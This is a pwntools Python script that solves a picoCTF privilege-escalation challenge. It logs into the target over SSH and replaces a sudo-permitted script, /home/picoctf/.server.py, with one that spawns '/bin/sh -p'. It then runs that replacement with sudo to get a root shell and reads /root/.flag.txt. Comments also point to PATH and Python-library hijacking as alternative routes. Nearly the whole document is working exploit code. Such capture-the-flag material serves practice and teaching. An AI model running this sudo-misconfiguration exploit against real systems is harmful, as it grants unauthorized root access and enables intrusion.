from pwn import *

# ------------------------------
# Configuration
# ------------------------------
USER = "picoctf"

# ------------------------------
# Connect via SSH
# ------------------------------
if not (args.HOST and args.PORT and args.PASSWORD):
    log.error("provide HOST and PORT and PASSWORD")
    exit(1)

log.info("sudo -l: root nopasswd on python3 /home/picoctf/.server.py")
log.info("few problems here (at least): .server.py calls os.system('ping...') which could be PATH hijacked, can hijack python libraries,")
log.info("but picoctf also owns the dir so you can rename .server.py and create a new one in its place. we'll do that")

s = ssh(host=args.HOST, user=USER, password=args.PASSWORD, port=int(args.PORT))

sh = s.shell()

sh.sendline(b"sudo -l")
sh.sendline(b"mv -f .server.py .server.py.bak")
sh.sendline(b"printf 'import os\nos.system(\\\"/bin/sh -p\\\")\n\n' > .server.py")
sh.sendline(b"sudo python3 /home/picoctf/.server.py")
sh.sendline(b"whoami")
sh.sendline(b"cat /root/.flag.txt")

sh.interactive()

sh.close()
s.close()
